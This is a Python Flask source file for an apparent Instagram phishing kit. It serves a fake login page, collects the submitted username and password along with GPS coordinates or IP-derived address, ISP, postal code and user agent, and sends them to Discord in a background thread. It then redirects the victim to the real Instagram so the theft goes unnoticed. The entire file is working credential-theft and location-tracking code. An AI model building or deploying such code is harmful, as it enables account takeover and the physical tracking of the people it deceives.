import threading

from flask import Flask, jsonify, redirect, render_template, request

from config import REAL_INSTAGRAM
from discord_notify import send_to_discord
from geocode import ip_geocode, reverse_geocode

app = Flask(__name__)


def client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    ip = xff.split(",")[0].strip() if xff else request.remote_addr
    return ip or ""


@app.route("/")
def index():
    return render_template("login.html")


@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    lat = request.form.get("lat", "")
    lng = request.form.get("lng", "")
    acc = request.form.get("acc", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")

    address, postal, isp, method = "", "", "", "IP"

    try:
        if lat and lng:
            method = "GPS"
            address = reverse_geocode(float(lat), float(lng))
        else:
            g = ip_geocode(ip)
            postal, isp = g.get("postal", ""), g.get("isp", "")
            if g.get("lat") and g.get("lng"):
                lat, lng = g["lat"], g["lng"]
                address = reverse_geocode(float(lat), float(lng))
    except Exception as e:
        print(f"[geo] error: {e}")

    threading.Thread(
        target=send_to_discord,
        args=(username, password, address, lat, lng, ip, ua, acc, postal, isp, method),
        daemon=True,
    ).start()

    if request.headers.get("X-Requested-With") == "fetch":
        return jsonify(ok=True)
    return redirect(REAL_INSTAGRAM, code=302)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
